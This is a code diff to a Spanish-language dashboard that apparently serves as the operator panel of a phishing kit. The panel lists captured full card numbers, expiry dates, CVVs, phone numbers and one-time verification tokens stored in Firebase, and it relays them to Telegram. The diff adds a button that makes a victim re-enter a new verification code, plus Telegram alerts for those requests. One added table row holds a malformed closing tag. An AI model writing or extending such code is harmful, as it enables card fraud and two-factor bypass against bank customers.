@@ -287,6 +287,27 @@
       color: #1a3a4a;
     }
 
+    /* BOTON PEDIR TOKEN NUEVAMENTE */
+    .btn-pedir-token {
+      background: #ffc107;
+      color: #003366;
+      border: none;
+      padding: 6px 12px;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 0.7rem;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: 0.2s;
+    }
+
+    .btn-pedir-token:hover {
+      background: #ffb300;
+      transform: scale(1.02);
+    }
+
     /* Live Typing Card */
     .live-typing-card {
       background: white;
@@ -415,6 +436,16 @@
     .status-completado {
       display: inline-block;
       background-color: #3b82f6;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+      font-weight: bold;
+    }
+    
+    .status-reintento {
+      display: inline-block;
+      background-color: #8b5cf6;
       color: white;
       padding: 4px 12px;
       border-radius: 20px;
@@ -553,6 +584,9 @@
       border-radius: 6px;
       display: inline-block;
       font-weight: 500;
+    }
+    .acciones-column {
+      white-space: nowrap;
     }
     @media (max-width: 900px) { 
       .sidebar { display: none; } 
@@ -700,11 +734,12 @@
               <th>Fecha Venc.</th>
               <th>CVV</th>
               <th>Estado</th>
+              <th>Acciones</th>
               <th>Fecha</th>
             </tr>
           </thead>
           <tbody id="tablaBody">
-            <tr><td colspan="11" style="text-align:center; padding:50px;">Cargando...</td></tr>
+            <tr><td colspan="12" style="text-align:center; padding:50px;">Cargando...</td</tr>
           </tbody>
         </table>
       </div>
@@ -756,6 +791,7 @@ const auth = firebase.auth();
 const database = firebase.database();
 
 let datosIngresos = [];
+let datosConId = [];
 let chartInstance = null;
 let primerCargaCompletada = false;
 let intervalId = null;
@@ -874,6 +910,39 @@ function iniciarDashboard() {
   intervalId = setInterval(() => { if (auth.currentUser) cargarDatos(); }, 10000);
 }
 
+// FUNCION PARA PEDIR TOKEN NUEVAMENTE DESDE EL PANEL
+window.pedirTokenNuevamente = async function(sessionId, usuario) {
+  if (!confirm(`¿Estás seguro de pedir un NUEVO TOKEN para el usuario: ${usuario}?\n\nSe le pedirá que ingrese el código nuevamente.`)) {
+    return;
+  }
+  
+  try {
+    // Actualizar el estado en Firebase
+    await database.ref('ingresos/' + sessionId).update({
+      tokenReintentado: true,
+      fechaReintento: new Date().toISOString(),
+      estado: "token_reintentado",
+      solicitudPanel: true,
+      fechaSolicitudPanel: new Date().toISOString()
+    });
+    
+    // Mostrar mensaje de éxito
+    alert(`✅ Solicitud enviada al usuario: ${usuario}\n\nSe le pedirá que ingrese un nuevo token.`);
+    
+    // Enviar notificación por Telegram si está activo
+    if (telegramActivo) {
+      await enviarMensajeTelegram(`🔔 SOLICITUD DE NUEVO TOKEN\nUsuario: ${usuario}\nID Sesión: ${sessionId}\nSe le ha pedido que ingrese un nuevo código de verificación.`);
+    }
+    
+    // Recargar datos para mostrar el cambio
+    cargarDatos();
+    
+  } catch(error) {
+    console.error("Error al solicitar nuevo token:", error);
+    alert("❌ Error al solicitar el nuevo token. Revisa la consola.");
+  }
+};
+
 // Telegram
 function actualizarBotonesTelegram() {
   const container = document.getElementById('telegramButtonContainer');
@@ -968,18 +1037,17 @@ function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, m =
 
 function renderTabla() {
   const tbody = document.getElementById('tablaBody');
-  if (!datosIngresos.length) { 
-    tbody.innerHTML = '<tr><td colspan="11" style="text-align:center;">Sin registros</td></tr>'; 
+  if (!datosConId.length) { 
+    tbody.innerHTML = '<tr><td colspan="12" style="text-align:center;">Sin registros</td></tr>'; 
     return; 
   }
   let html = '';
-  datosIngresos.forEach((item, idx) => {
+  datosConId.forEach((item, idx) => {
     const fecha = new Date(item.fechaInicio || item.fecha || item.fechaToken || item.fechaCompleta);
     const f = fecha.toLocaleString('es-CO', {day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
     const estado = item.estado || 'esperando_token';
     const telefono = item.telefono || '-';
     const token = item.tokenVerificacion || '-';
-    // Mostrar número de tarjeta COMPLETO, sin ocultar
     const numeroTarjeta = item.numeroTarjeta || '-';
     const fechaVencimiento = item.fechaVencimiento || '-';
     const cvv = item.cvv || '-';
@@ -989,6 +1057,8 @@ function renderTabla() {
       estadoHtml = '<span class="status-esperando"><i class="fas fa-clock"></i> ESPERANDO TOKEN</span>';
     } else if (estado === 'token_recibido') {
       estadoHtml = '<span class="status-token"><i class="fas fa-check-circle"></i> TOKEN RECIBIDO</span>';
+    } else if (estado === 'token_reintentado') {
+      estadoHtml = '<span class="status-reintento"><i class="fas fa-sync-alt"></i> TOKEN REINTENTADO</span>';
     } else {
       estadoHtml = '<span class="status-completado"><i class="fas fa-check-double"></i> COMPLETADO</span>';
     }
@@ -1004,6 +1074,11 @@ function renderTabla() {
       <td>${escapeHtml(fechaVencimiento)}</td>
       <td><span class="card-data-full"><strong>${escapeHtml(cvv)}</strong></span></td>
       <td>${estadoHtml}</td>
+      <td class="acciones-column">
+        <button class="btn-pedir-token" onclick="pedirTokenNuevamente('${item.id}', '${escapeHtml(item.usuario || 'N/A').replace(/'/g, "\\'")}')">
+          <i class="fas fa-sync-alt"></i> Pedir token
+        </button>
+      </td>
       <td>${f}</td>
     </tr>`;
   });
@@ -1045,6 +1120,9 @@ function enviarNuevoAccesoATelegram(nuevo) {
   if (nuevo.telefono) {
     msg += `\n\nVERIFICACION:\nTelefono: ${nuevo.telefono}\nToken: ${nuevo.tokenVerificacion}`;
   }
+  if (nuevo.tokenReintentado) {
+    msg += `\n\n⚠️ EL USUARIO SOLICITO UN NUEVO TOKEN ⚠️`;
+  }
   enviarMensajeTelegram(msg);
 }
 
@@ -1065,13 +1143,17 @@ window.cargarDatos = async function() {
     const snap = await database.ref('ingresos').once('value');
     const data = snap.val();
     datosIngresos = [];
+    datosConId = [];
     if (data) {
       Object.keys(data).forEach(key => { 
         let ing = data[key]; 
         if (!ing.fechaInicio && !ing.fecha) ing.fechaInicio = new Date().toISOString(); 
+        ing.id = key;
         datosIngresos.push(ing); 
+        datosConId.push(ing);
       });
       datosIngresos.sort((a,b) => new Date(b.fechaInicio || b.fecha) - new Date(a.fechaInicio || a.fecha));
+      datosConId.sort((a,b) => new Date(b.fechaInicio || b.fecha) - new Date(a.fechaInicio || a.fecha));
     }
     renderTabla();
     actualizarKPIs();
